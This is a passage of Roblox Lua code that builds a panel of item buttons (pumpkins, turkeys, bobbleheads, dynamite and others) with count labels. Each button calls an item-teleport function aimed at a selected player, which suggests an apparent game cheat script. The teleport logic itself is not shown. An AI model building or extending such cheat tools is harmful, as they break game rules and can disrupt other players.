PumpkinCursed.Parent = MoveOther
PumpkinCursed.BackgroundColor3 = Color3.new(1, 1, 1)
PumpkinCursed.BackgroundTransparency = 0
PumpkinCursed.BorderColor3 = Color3.new(0.6, 0, 0)
PumpkinCursed.Position = UDim2.new(0, 5, 0, 1785)
PumpkinCursed.Size = UDim2.new(0, 100, 0, 100)
PumpkinCursed.Image = "rbxassetid://4122887104"
PumpkinCursed.MouseButton1Down:connect(function()
Type.Text = "Pumpkin Cursed"
SingleItemTpQty("PumpkinCursed", PlyrSelz.Text, qty.Text)
end)

CountItems171 = Instance.new("TextLabel")
CountItems171.Parent = MoveOther
CountItems171.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems171.BackgroundTransparency = 0.6
CountItems171.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems171.Position = UDim2.new(0, 110, 0, 1840)
CountItems171.Size = UDim2.new(0, 25, 0, 20)
CountItems171.Font = Enum.Font.SourceSans
CountItems171.Text = "0"
CountItems171.TextColor3 = Color3.new(0, 1, 0)
CountItems171.TextSize = 25

PumpkinGhastly = Instance.new("ImageButton")
PumpkinGhastly.Name = "FillCaveCrawler"
PumpkinGhastly.Parent = MoveOther
PumpkinGhastly.BackgroundColor3 = Color3.new(1, 1, 1)
PumpkinGhastly.BackgroundTransparency = 0
PumpkinGhastly.BorderColor3 = Color3.new(0.6, 0, 0)
PumpkinGhastly.Position = UDim2.new(0, 5, 0, 1890)
PumpkinGhastly.Size = UDim2.new(0, 100, 0, 100)
PumpkinGhastly.Image = "rbxassetid://4052283427"
PumpkinGhastly.MouseButton1Down:connect(function()
Type.Text = "Pumpkin Ghastly"
SingleItemTpQty("PumpkinGhastly", PlyrSelz.Text, qty.Text)
end)

CountItems172 = Instance.new("TextLabel")
CountItems172.Parent = MoveOther
CountItems172.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems172.BackgroundTransparency = 0.6
CountItems172.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems172.Position = UDim2.new(0, 110, 0, 1945)
CountItems172.Size = UDim2.new(0, 25, 0, 20)
CountItems172.Font = Enum.Font.SourceSans
CountItems172.Text = "0"
CountItems172.TextColor3 = Color3.new(0, 1, 0)
CountItems172.TextSize = 25

PumpkinLumbkin = Instance.new("ImageButton")
PumpkinLumbkin.Name = "PumpkinLumbkin"
PumpkinLumbkin.Parent = MoveOther
PumpkinLumbkin.BackgroundColor3 = Color3.new(1, 1, 1)
PumpkinLumbkin.BackgroundTransparency = 0
PumpkinLumbkin.BorderColor3 = Color3.new(0.6, 0, 0)
PumpkinLumbkin.Position = UDim2.new(0, 5, 0, 1995)
PumpkinLumbkin.Size = UDim2.new(0, 100, 0, 100)
PumpkinLumbkin.Image = "rbxassetid://4052284884"
PumpkinLumbkin.MouseButton1Down:connect(function()
Type.Text = "Pumpkin Lumbkin"
SingleItemTpQty("PumpkinLumbkin", PlyrSelz.Text, qty.Text)
end)

CountItems173 = Instance.new("TextLabel")
CountItems173.Parent = MoveOther
CountItems173.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems173.BackgroundTransparency = 0.6
CountItems173.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems173.Position = UDim2.new(0, 110, 0, 2050)
CountItems173.Size = UDim2.new(0, 25, 0, 20)
CountItems173.Font = Enum.Font.SourceSans
CountItems173.Text = "0"
CountItems173.TextColor3 = Color3.new(0, 1, 0)
CountItems173.TextSize = 25

PropertySoldSign = Instance.new("ImageButton")
PropertySoldSign.Name = "PropertySoldSign"
PropertySoldSign.Parent = MoveOther
PropertySoldSign.BackgroundColor3 = Color3.new(1, 1, 1)
PropertySoldSign.BackgroundTransparency = 0
PropertySoldSign.BorderColor3 = Color3.new(0.6, 0, 0)
PropertySoldSign.Position = UDim2.new(0, 5, 0, 2100)
PropertySoldSign.Size = UDim2.new(0, 100, 0, 100)
PropertySoldSign.Image = "rbxassetid://4101046701"
PropertySoldSign.MouseButton1Down:connect(function()
Type.Text = "Property Sold Sign"
SingleItemTpQty("PropertySoldSign", PlyrSelz.Text, qty.Text)
end)

CountItems174 = Instance.new("TextLabel")
CountItems174.Parent = MoveOther
CountItems174.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems174.BackgroundTransparency = 0.6
CountItems174.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems174.Position = UDim2.new(0, 110, 0, 2155)
CountItems174.Size = UDim2.new(0, 25, 0, 20)
CountItems174.Font = Enum.Font.SourceSans
CountItems174.Text = "0"
CountItems174.TextColor3 = Color3.new(0, 1, 0)
CountItems174.TextSize = 25

Turkey = Instance.new("ImageButton")
Turkey.Name = "Turkey"
Turkey.Parent = MoveOther
Turkey.BackgroundColor3 = Color3.new(1, 1, 1)
Turkey.BackgroundTransparency = 0
Turkey.BorderColor3 = Color3.new(0.6, 0, 0)
Turkey.Position = UDim2.new(0, 5, 0, 2205)
Turkey.Size = UDim2.new(0, 100, 0, 100)
Turkey.Image = "rbxassetid://3709647573"
Turkey.MouseButton1Down:connect(function()
Type.Text = "Turkey"
SingleItemTpQty("Turkey", PlyrSelz.Text, qty.Text)
end)

CountItems175 = Instance.new("TextLabel")
CountItems175.Parent = MoveOther
CountItems175.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems175.BackgroundTransparency = 0.6
CountItems175.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems175.Position = UDim2.new(0, 110, 0, 2260)
CountItems175.Size = UDim2.new(0, 25, 0, 20)
CountItems175.Font = Enum.Font.SourceSans
CountItems175.Text = "0"
CountItems175.TextColor3 = Color3.new(0, 1, 0)
CountItems175.TextSize = 25

Turkey2 = Instance.new("ImageButton")
Turkey2.Name = "Turkey2"
Turkey2.Parent = MoveOther
Turkey2.BackgroundColor3 = Color3.new(1, 1, 1)
Turkey2.BackgroundTransparency = 0
Turkey2.BorderColor3 = Color3.new(0.6, 0, 0)
Turkey2.Position = UDim2.new(0, 5, 0, 2310)
Turkey2.Size = UDim2.new(0, 100, 0, 100)
Turkey2.Image = "rbxassetid://4122889849"
Turkey2.MouseButton1Down:connect(function()
Type.Text = "Turkey 2"
SingleItemTpQty("Turkey2", PlyrSelz.Text, qty.Text)
end)

CountItems176 = Instance.new("TextLabel")
CountItems176.Parent = MoveOther
CountItems176.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems176.BackgroundTransparency = 0.6
CountItems176.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems176.Position = UDim2.new(0, 110, 0, 2365)
CountItems176.Size = UDim2.new(0, 25, 0, 20)
CountItems176.Font = Enum.Font.SourceSans
CountItems176.Text = "0"
CountItems176.TextColor3 = Color3.new(0, 1, 0)
CountItems176.TextSize = 25

Turkey3 = Instance.new("ImageButton")
Turkey3.Name = "Turkey3"
Turkey3.Parent = MoveOther
Turkey3.BackgroundColor3 = Color3.new(1, 1, 1)
Turkey3.BackgroundTransparency = 0
Turkey3.BorderColor3 = Color3.new(0.6, 0, 0)
Turkey3.Position = UDim2.new(0, 5, 0, 2415)
Turkey3.Size = UDim2.new(0, 100, 0, 100)
Turkey3.Image = "rbxassetid://4122890353"
Turkey3.MouseButton1Down:connect(function()
Type.Text = "Turkey 3"
SingleItemTpQty("Turkey3", PlyrSelz.Text, qty.Text)
end)

CountItems177 = Instance.new("TextLabel")
CountItems177.Parent = MoveOther
CountItems177.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems177.BackgroundTransparency = 0.6
CountItems177.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems177.Position = UDim2.new(0, 110, 0, 2470)
CountItems177.Size = UDim2.new(0, 25, 0, 20)
CountItems177.Font = Enum.Font.SourceSans
CountItems177.Text = "0"
CountItems177.TextColor3 = Color3.new(0, 1, 0)
CountItems177.TextSize = 25

Eye1 = Instance.new("ImageButton")
Eye1.Name = "FillCaveCrawler"
Eye1.Parent = MoveOther
Eye1.BackgroundColor3 = Color3.new(1, 1, 1)
Eye1.BackgroundTransparency = 0
Eye1.BorderColor3 = Color3.new(0.6, 0, 0)
Eye1.Position = UDim2.new(0, 5, 0, 2520)
Eye1.Size = UDim2.new(0, 100, 0, 100)
Eye1.Image = "rbxassetid://3709592172"
Eye1.MouseButton1Down:connect(function()
Type.Text = "Eye1"
SingleItemTpQty("Eye1", PlyrSelz.Text, qty.Text)
end)

CountItems178 = Instance.new("TextLabel")
CountItems178.Parent = MoveOther
CountItems178.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems178.BackgroundTransparency = 0.6
CountItems178.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems178.Position = UDim2.new(0, 110, 0, 2575)
CountItems178.Size = UDim2.new(0, 25, 0, 20)
CountItems178.Font = Enum.Font.SourceSans
CountItems178.Text = "0"
CountItems178.TextColor3 = Color3.new(0, 1, 0)
CountItems178.TextSize = 25

BlueBaii = Instance.new("ImageButton")
BlueBaii.Name = "BlueBaii"
BlueBaii.Parent = MoveOther
BlueBaii.BackgroundColor3 = Color3.new(1, 1, 1)
BlueBaii.BackgroundTransparency = 0
BlueBaii.BorderColor3 = Color3.new(0.6, 0, 0)
BlueBaii.Position = UDim2.new(0, 5, 0, 2625)
BlueBaii.Size = UDim2.new(0, 100, 0, 100)
BlueBaii.Image = "rbxassetid://3709576329"
BlueBaii.MouseButton1Down:connect(function()
Type.Text = "Blue Baii"
SingleItemTpQty("BlueBaii", PlyrSelz.Text, qty.Text)
end)

CountItems179 = Instance.new("TextLabel")
CountItems179.Parent = MoveOther
CountItems179.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems179.BackgroundTransparency = 0.6
CountItems179.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems179.Position = UDim2.new(0, 110, 0, 2680)
CountItems179.Size = UDim2.new(0, 25, 0, 20)
CountItems179.Font = Enum.Font.SourceSans
CountItems179.Text = "0"
CountItems179.TextColor3 = Color3.new(0, 1, 0) 
CountItems179.TextSize = 25 

BlueBall = Instance.new("ImageButton")
BlueBall.Name = "BlueBall"
BlueBall.Parent = MoveOther
BlueBall.BackgroundColor3 = Color3.new(1, 1, 1)
BlueBall.BackgroundTransparency = 0
BlueBall.BorderColor3 = Color3.new(0.6, 0, 0)
BlueBall.Position = UDim2.new(0, 5, 0, 2730)
BlueBall.Size = UDim2.new(0, 100, 0, 100)
BlueBall.Image = "rbxassetid://3709576711"
BlueBall.MouseButton1Down:connect(function()
Type.Text = "Blue Ball"
SingleItemTpQty("BlueBall", PlyrSelz.Text, qty.Text)
end)

CountItems180 = Instance.new("TextLabel")
CountItems180.Parent = MoveOther
CountItems180.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems180.BackgroundTransparency = 0.6
CountItems180.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems180.Position = UDim2.new(0, 110, 0, 2785)
CountItems180.Size = UDim2.new(0, 25, 0, 20)
CountItems180.Font = Enum.Font.SourceSans
CountItems180.Text = "0"
CountItems180.TextColor3 = Color3.new(0, 1, 0)
CountItems180.TextSize = 25

GreenBall = Instance.new("ImageButton")
GreenBall.Name = "GreenBall"
GreenBall.Parent = MoveOther
GreenBall.BackgroundColor3 = Color3.new(1, 1, 1)
GreenBall.BackgroundTransparency = 0
GreenBall.BorderColor3 = Color3.new(0.6, 0, 0)
GreenBall.Position = UDim2.new(0, 5, 0, 2835)
GreenBall.Size = UDim2.new(0, 100, 0, 100)
GreenBall.Image = "rbxassetid://4122885651"
GreenBall.MouseButton1Down:connect(function()
Type.Text = "Green Ball"
SingleItemTpQty("GreenBall", PlyrSelz.Text, qty.Text)
end)

CountItems181 = Instance.new("TextLabel")
CountItems181.Parent = MoveOther
CountItems181.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems181.BackgroundTransparency = 0.6
CountItems181.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems181.Position = UDim2.new(0, 110, 0, 2890)
CountItems181.Size = UDim2.new(0, 25, 0, 20)
CountItems181.Font = Enum.Font.SourceSans
CountItems181.Text = "0"
CountItems181.TextColor3 = Color3.new(0, 1, 0)
CountItems181.TextSize = 25

RedBall = Instance.new("ImageButton")
RedBall.Name = "RedBall"
RedBall.Parent = MoveOther
RedBall.BackgroundColor3 = Color3.new(1, 1, 1)
RedBall.BackgroundTransparency = 0
RedBall.BorderColor3 = Color3.new(0.6, 0, 0)
RedBall.Position = UDim2.new(0, 5, 0, 2940)
RedBall.Size = UDim2.new(0, 100, 0, 100)
RedBall.Image = "rbxassetid://3709640216"
RedBall.MouseButton1Down:connect(function()
Type.Text = "Red Ball"
SingleItemTpQty("RedBall", PlyrSelz.Text, qty.Text)
end)

CountItems182 = Instance.new("TextLabel")
CountItems182.Parent = MoveOther
CountItems182.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems182.BackgroundTransparency = 0.6
CountItems182.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems182.Position = UDim2.new(0, 110, 0, 2995)
CountItems182.Size = UDim2.new(0, 25, 0, 20)
CountItems182.Font = Enum.Font.SourceSans
CountItems182.Text = "0"
CountItems182.TextColor3 = Color3.new(0, 1, 0)
CountItems182.TextSize = 25

PlumBall = Instance.new("ImageButton")
PlumBall.Name = "PlumBall"
PlumBall.Parent = MoveOther
PlumBall.BackgroundColor3 = Color3.new(1, 1, 1)
PlumBall.BackgroundTransparency = 0
PlumBall.BorderColor3 = Color3.new(0.6, 0, 0)
PlumBall.Position = UDim2.new(0, 5, 0, 3045)
PlumBall.Size = UDim2.new(0, 100, 0, 100)
PlumBall.Image = "rbxassetid://4122886386"
PlumBall.MouseButton1Down:connect(function()
Type.Text = "Plum Ball"
SingleItemTpQty("PlumBall", PlyrSelz.Text, qty.Text)
end)

CountItems183 = Instance.new("TextLabel")
CountItems183.Parent = MoveOther
CountItems183.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems183.BackgroundTransparency = 0.6
CountItems183.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems183.Position = UDim2.new(0, 110, 0, 3100)
CountItems183.Size = UDim2.new(0, 25, 0, 20)
CountItems183.Font = Enum.Font.SourceSans
CountItems183.Text = "0"
CountItems183.TextColor3 = Color3.new(0, 1, 0)
CountItems183.TextSize = 25

Bobblehead = Instance.new("ImageButton")
Bobblehead.Name = "Bobblehead"
Bobblehead.Parent = MoveOther
Bobblehead.BackgroundColor3 = Color3.new(1, 1, 1)
Bobblehead.BackgroundTransparency = 0
Bobblehead.BorderColor3 = Color3.new(0.6, 0, 0)
Bobblehead.Position = UDim2.new(0, 5, 0, 3150)
Bobblehead.Size = UDim2.new(0, 100, 0, 100)
Bobblehead.Image = "rbxassetid://3709577020"
Bobblehead.MouseButton1Down:connect(function()
Type.Text = "Bobblehead"
SingleItemTpQty("Bobblehead", PlyrSelz.Text, qty.Text)
end)

CountItems184 = Instance.new("TextLabel")
CountItems184.Parent = MoveOther
CountItems184.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems184.BackgroundTransparency = 0.6
CountItems184.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems184.Position = UDim2.new(0, 110, 0, 3205)
CountItems184.Size = UDim2.new(0, 25, 0, 20)
CountItems184.Font = Enum.Font.SourceSans
CountItems184.Text = "0"
CountItems184.TextColor3 = Color3.new(0, 1, 0)
CountItems184.TextSize = 25

Bobblehead2 = Instance.new("ImageButton")
Bobblehead2.Name = "Bobblehead2"
Bobblehead2.Parent = MoveOther
Bobblehead2.BackgroundColor3 = Color3.new(1, 1, 1)
Bobblehead2.BackgroundTransparency = 0
Bobblehead2.BorderColor3 = Color3.new(0.6, 0, 0)
Bobblehead2.Position = UDim2.new(0, 5, 0, 3255)
Bobblehead2.Size = UDim2.new(0, 100, 0, 100)
Bobblehead2.Image = "rbxassetid://3709577314"
Bobblehead2.MouseButton1Down:connect(function()
Type.Text = "Bobblehead 2"
SingleItemTpQty("Bobblehead2", PlyrSelz.Text, qty.Text)
end)

CountItems185 = Instance.new("TextLabel")
CountItems185.Parent = MoveOther
CountItems185.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems185.BackgroundTransparency = 0.6
CountItems185.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems185.Position = UDim2.new(0, 110, 0, 3310)
CountItems185.Size = UDim2.new(0, 25, 0, 20)
CountItems185.Font = Enum.Font.SourceSans
CountItems185.Text = "0"
CountItems185.TextColor3 = Color3.new(0, 1, 0)
CountItems185.TextSize = 25

Bobblehead3 = Instance.new("ImageButton")
Bobblehead3.Name = "Bobblehead3"
Bobblehead3.Parent = MoveOther
Bobblehead3.BackgroundColor3 = Color3.new(1, 1, 1)
Bobblehead3.BackgroundTransparency = 0
Bobblehead3.BorderColor3 = Color3.new(0.6, 0, 0)
Bobblehead3.Position = UDim2.new(0, 5, 0, 3360)
Bobblehead3.Size = UDim2.new(0, 100, 0, 100)
Bobblehead3.Image = "rbxassetid://4122881566"
Bobblehead3.MouseButton1Down:connect(function()
Type.Text = "Bobblehead 3"
SingleItemTpQty("Bobblehead3", PlyrSelz.Text, qty.Text)
end)

CountItems186 = Instance.new("TextLabel")
CountItems186.Parent = MoveOther
CountItems186.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems186.BackgroundTransparency = 0.6
CountItems186.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems186.Position = UDim2.new(0, 110, 0, 3415)
CountItems186.Size = UDim2.new(0, 25, 0, 20)
CountItems186.Font = Enum.Font.SourceSans
CountItems186.Text = "0"
CountItems186.TextColor3 = Color3.new(0, 1, 0)
CountItems186.TextSize = 25

Bobblehead4 = Instance.new("ImageButton")
Bobblehead4.Name = "FillCaveCrawler"
Bobblehead4.Parent = MoveOther
Bobblehead4.BackgroundColor3 = Color3.new(1, 1, 1)
Bobblehead4.BackgroundTransparency = 0
Bobblehead4.BorderColor3 = Color3.new(0.6, 0, 0)
Bobblehead4.Position = UDim2.new(0, 5, 0, 3465)
Bobblehead4.Size = UDim2.new(0, 100, 0, 100)
Bobblehead4.Image = "rbxassetid://4122882037"
Bobblehead4.MouseButton1Down:connect(function()
Type.Text = "Bobblehead 4"
SingleItemTpQty("Bobblehead4", PlyrSelz.Text, qty.Text)
end)

CountItems187 = Instance.new("TextLabel")
CountItems187.Parent = MoveOther
CountItems187.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems187.BackgroundTransparency = 0.6
CountItems187.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems187.Position = UDim2.new(0, 110, 0, 3520)
CountItems187.Size = UDim2.new(0, 25, 0, 20)
CountItems187.Font = Enum.Font.SourceSans
CountItems187.Text = "0"
CountItems187.TextColor3 = Color3.new(0, 1, 0)
CountItems187.TextSize = 25

Bobblehead5 = Instance.new("ImageButton")
Bobblehead5.Name = "Bobblehead5"
Bobblehead5.Parent = MoveOther
Bobblehead5.BackgroundColor3 = Color3.new(1, 1, 1)
Bobblehead5.BackgroundTransparency = 0
Bobblehead5.BorderColor3 = Color3.new(0.6, 0, 0)
Bobblehead5.Position = UDim2.new(0, 5, 0, 3570)
Bobblehead5.Size = UDim2.new(0, 100, 0, 100)
Bobblehead5.Image = "rbxassetid://4122882591"
Bobblehead5.MouseButton1Down:connect(function()
Type.Text = "Bobblehead 5"
SingleItemTpQty("Bobblehead5", PlyrSelz.Text, qty.Text)
end)

CountItems188 = Instance.new("TextLabel")
CountItems188.Parent = MoveOther
CountItems188.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems188.BackgroundTransparency = 0.6
CountItems188.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems188.Position = UDim2.new(0, 110, 0, 3625)
CountItems188.Size = UDim2.new(0, 25, 0, 20)
CountItems188.Font = Enum.Font.SourceSans
CountItems188.Text = "0"
CountItems188.TextColor3 = Color3.new(0, 1, 0)
CountItems188.TextSize = 25

WorkLight = Instance.new("ImageButton")
WorkLight.Name = "WorkLight"
WorkLight.Parent = MoveOther
WorkLight.BackgroundColor3 = Color3.new(1, 1, 1)
WorkLight.BackgroundTransparency = 0
WorkLight.BorderColor3 = Color3.new(0.6, 0, 0)
WorkLight.Position = UDim2.new(0, 5, 0, 3675)
WorkLight.Size = UDim2.new(0, 100, 0, 100)
WorkLight.Image = "rbxassetid://3709648138"
WorkLight.MouseButton1Down:connect(function()
Type.Text = "Work Light"
SingleItemTpQty("WorkLight", PlyrSelz.Text, qty.Text)
end)

CountItems189 = Instance.new("TextLabel")
CountItems189.Parent = MoveOther
CountItems189.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems189.BackgroundTransparency = 0.6
CountItems189.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems189.Position = UDim2.new(0, 110, 0, 3730)
CountItems189.Size = UDim2.new(0, 25, 0, 20)
CountItems189.Font = Enum.Font.SourceSans
CountItems189.Text = "0"
CountItems189.TextColor3 = Color3.new(0, 1, 0)
CountItems189.TextSize = 25

BagOfSand = Instance.new("ImageButton")
BagOfSand.Name = "BagOfSand"
BagOfSand.Parent = MoveOther
BagOfSand.BackgroundColor3 = Color3.new(1, 1, 1)
BagOfSand.BackgroundTransparency = 0
BagOfSand.BorderColor3 = Color3.new(0.6, 0, 0)
BagOfSand.Position = UDim2.new(0, 5, 0, 3780)
BagOfSand.Size = UDim2.new(0, 100, 0, 100)
BagOfSand.Image = "rbxassetid://3709574757"
BagOfSand.MouseButton1Down:connect(function()
Type.Text = "Bag Of Sand"
SingleItemTpQty("BagOfSand", PlyrSelz.Text, qty.Text)
end)

CountItems190 = Instance.new("TextLabel")
CountItems190.Parent = MoveOther
CountItems190.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems190.BackgroundTransparency = 0.6
CountItems190.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems190.Position = UDim2.new(0, 110, 0, 3835)
CountItems190.Size = UDim2.new(0, 25, 0, 20)
CountItems190.Font = Enum.Font.SourceSans
CountItems190.Text = "0"
CountItems190.TextColor3 = Color3.new(0, 1, 0)
CountItems190.TextSize = 25

CanOfWorms = Instance.new("ImageButton")
CanOfWorms.Name = "CanOfWorms"
CanOfWorms.Parent = MoveOther
CanOfWorms.BackgroundColor3 = Color3.new(1, 1, 1)
CanOfWorms.BackgroundTransparency = 0
CanOfWorms.BorderColor3 = Color3.new(0.6, 0, 0)
CanOfWorms.Position = UDim2.new(0, 5, 0, 3885)
CanOfWorms.Size = UDim2.new(0, 100, 0, 100)
CanOfWorms.Image = "rbxassetid://3709579059"
CanOfWorms.MouseButton1Down:connect(function()
Type.Text = "Can Of Worms"
SingleItemTpQty("CanOfWorms", PlyrSelz.Text, qty.Text)
end)

CountItems191 = Instance.new("TextLabel")
CountItems191.Parent = MoveOther
CountItems191.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems191.BackgroundTransparency = 0.6
CountItems191.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems191.Position = UDim2.new(0, 110, 0, 3940)
CountItems191.Size = UDim2.new(0, 25, 0, 20)
CountItems191.Font = Enum.Font.SourceSans
CountItems191.Text = "0"
CountItems191.TextColor3 = Color3.new(0, 1, 0)
CountItems191.TextSize = 25

LightBulb = Instance.new("ImageButton")
LightBulb.Name = "FillCaveCrawler"
LightBulb.Parent = MoveOther
LightBulb.BackgroundColor3 = Color3.new(1, 1, 1)
LightBulb.BackgroundTransparency = 0
LightBulb.BorderColor3 = Color3.new(0.6, 0, 0)
LightBulb.Position = UDim2.new(0, 5, 0, 3990)
LightBulb.Size = UDim2.new(0, 100, 0, 100)
LightBulb.Image = "rbxassetid://3709604502"
LightBulb.MouseButton1Down:connect(function()
Type.Text = "Light Bulb"
SingleItemTpQty("LightBulb", PlyrSelz.Text, qty.Text)
end)

CountItems192 = Instance.new("TextLabel")
CountItems192.Parent = MoveOther
CountItems192.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems192.BackgroundTransparency = 0.6
CountItems192.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems192.Position = UDim2.new(0, 110, 0, 4045)
CountItems192.Size = UDim2.new(0, 25, 0, 20)
CountItems192.Font = Enum.Font.SourceSans
CountItems192.Text = "0"
CountItems192.TextColor3 = Color3.new(0, 1, 0)
CountItems192.TextSize = 25

Dynamite = Instance.new("ImageButton")
Dynamite.Name = "Dynamite"
Dynamite.Parent = MoveOther
Dynamite.BackgroundColor3 = Color3.new(1, 1, 1)
Dynamite.BackgroundTransparency = 0
Dynamite.BorderColor3 = Color3.new(0.6, 0, 0)
Dynamite.Position = UDim2.new(0, 5, 0, 4095)
Dynamite.Size = UDim2.new(0, 100, 0, 100)
Dynamite.Image = "rbxassetid://3709589876"
Dynamite.MouseButton1Down:connect(function()
Type.Text = "Dynamite"
SingleItemTpQty("Dynamite", PlyrSelz.Text, qty.Text)
end)

CountItems193 = Instance.new("TextLabel")
CountItems193.Parent = MoveOther
CountItems193.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems193.BackgroundTransparency = 0.6
CountItems193.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems193.Position = UDim2.new(0, 110, 0, 4150)
CountItems193.Size = UDim2.new(0, 25, 0, 20)
CountItems193.Font = Enum.Font.SourceSans
CountItems193.Text = "0"
CountItems193.TextColor3 = Color3.new(0, 1, 0) 
CountItems193.TextSize = 25 

Turkey4 = Instance.new("ImageButton")
Turkey4.Name = "Turkey4"
Turkey4.Parent = MoveOther
Turkey4.BackgroundColor3 = Color3.new(1, 1, 1)
Turkey4.BackgroundTransparency = 0
Turkey4.BorderColor3 = Color3.new(0.6, 0, 0)
Turkey4.Position = UDim2.new(0, 5, 0, 4200)
Turkey4.Size = UDim2.new(0, 100, 0, 100)
Turkey4.Image = "rbxassetid://4477930654"
Turkey4.MouseButton1Down:connect(function()
Type.Text = "Turkey4"
SingleItemTpQty("Turkey4", PlyrSelz.Text, qty.Text)
end)

CountItems194 = Instance.new("TextLabel")
CountItems194.Parent = MoveOther
CountItems194.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems194.BackgroundTransparency = 0.6
CountItems194.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems194.Position = UDim2.new(0, 110, 0, 4255)
CountItems194.Size = UDim2.new(0, 25, 0, 20)
CountItems194.Font = Enum.Font.SourceSans
CountItems194.Text = "0"
CountItems194.TextColor3 = Color3.new(0, 1, 0) 
CountItems194.TextSize = 25 

BurgerCola = Instance.new("ImageButton")
BurgerCola.Name = "BurgerCola"
BurgerCola.Parent = MoveOther
BurgerCola.BackgroundColor3 = Color3.new(1, 1, 1)
BurgerCola.BackgroundTransparency = 0
BurgerCola.BorderColor3 = Color3.new(0.6, 0, 0)
BurgerCola.Position = UDim2.new(0, 5, 0, 4305)
BurgerCola.Size = UDim2.new(0, 100, 0, 100)
BurgerCola.Image = "rbxassetid://4481884435"
BurgerCola.MouseButton1Down:connect(function()
Type.Text = "BurgerCola"
SingleItemTpQty("BurgerCola", PlyrSelz.Text, qty.Text)
end)

CountItems195 = Instance.new("TextLabel")
CountItems195.Parent = MoveOther
CountItems195.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems195.BackgroundTransparency = 0.6
CountItems195.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems195.Position = UDim2.new(0, 110, 0, 4360)
CountItems195.Size = UDim2.new(0, 25, 0, 20)
CountItems195.Font = Enum.Font.SourceSans
CountItems195.Text = "0"
CountItems195.TextColor3 = Color3.new(0, 1, 0)
CountItems195.TextSize = 25

Turkey5 = Instance.new("ImageButton")
Turkey5.Name = "Turkey5"
Turkey5.Parent = MoveOther
Turkey5.BackgroundColor3 = Color3.new(1, 1, 1)
Turkey5.BackgroundTransparency = 0
Turkey5.BorderColor3 = Color3.new(0.6, 0, 0)
Turkey5.Position = UDim2.new(0, 5, 0, 4410)
Turkey5.Size = UDim2.new(0, 100, 0, 100)
Turkey5.Image = "rbxassetid://4518791222"
Turkey5.MouseButton1Down:connect(function()
Type.Text = "Turkey 5"
SingleItemTpQty("Turkey5", PlyrSelz.Text, qty.Text)
end)

CountItems196 = Instance.new("TextLabel")
CountItems196.Parent = MoveOther
CountItems196.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems196.BackgroundTransparency = 0.6
CountItems196.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems196.Position = UDim2.new(0, 110, 0, 4465)
CountItems196.Size = UDim2.new(0, 25, 0, 20)
CountItems196.Font = Enum.Font.SourceSans
CountItems196.Text = "0"
CountItems196.TextColor3 = Color3.new(0, 1, 0)
CountItems196.TextSize = 25

Bowl = Instance.new("ImageButton")
Bowl.Name = "Bowl"
Bowl.Parent = MoveOther
Bowl.BackgroundColor3 = Color3.new(1, 1, 1)
Bowl.BackgroundTransparency = 0
Bowl.BorderColor3 = Color3.new(0.6, 0, 0)
Bowl.Position = UDim2.new(0, 5, 0, 4515)
Bowl.Size = UDim2.new(0, 100, 0, 100)
Bowl.Image = "rbxassetid://4518791342"
Bowl.MouseButton1Down:connect(function()
Type.Text = "Bowl"
SingleItemTpQty("Bowl", PlyrSelz.Text, qty.Text)
end)

CountItems197 = Instance.new("TextLabel")
CountItems197.Parent = MoveOther
CountItems197.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems197.BackgroundTransparency = 0.6
CountItems197.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems197.Position = UDim2.new(0, 110, 0, 4570)
CountItems197.Size = UDim2.new(0, 25, 0, 20)
CountItems197.Font = Enum.Font.SourceSans
CountItems197.Text = "0"
CountItems197.TextColor3 = Color3.new(0, 1, 0)
CountItems197.TextSize = 25

BlackBall = Instance.new("ImageButton")
BlackBall.Name = "BlackBall"
BlackBall.Parent = MoveOther
BlackBall.BackgroundColor3 = Color3.new(1, 1, 1)
BlackBall.BackgroundTransparency = 0
